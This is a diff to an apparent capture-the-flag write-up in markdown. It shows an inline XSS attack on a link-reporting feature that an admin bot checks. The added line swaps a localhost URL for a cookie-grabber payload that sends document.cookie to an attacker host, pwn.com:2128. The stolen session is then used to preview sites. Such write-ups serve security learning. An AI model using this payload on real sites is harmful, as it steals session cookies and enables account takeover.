@@ -75,7 +75,7 @@ def report(request):
 so there is feature that check links that reported , this the way how our admin checks the inline XSS link
 
 let's craft and cookie grabber 
-> [link]javascript:document.location="http://127.0.0.1/"+document.cookie
+> [link]javascript:document.location="http://pwn.com:2128/"+document.cookie
 
 and we listen for the request and report the link for being broken 
 ```
@@ -92,4 +92,15 @@ Upgrade-Insecure-Requests: 1
 ```
 
 > Bingo we have the verfied user session so we can preview sites now 
+
+![NikoCat](https://screenshotscdn.firefoxusercontent.com/images/0b810f23-03d8-4889-80da-559d79829b1f.png)
+
+lets try to preview site 
+> [link]http://www.google.com
+
+it works
+
+![NikoCat](https://screenshotscdn.firefoxusercontent.com/images/8b72962e-0868-4c32-8e89-e2442588fb7d.png)
+
+
 
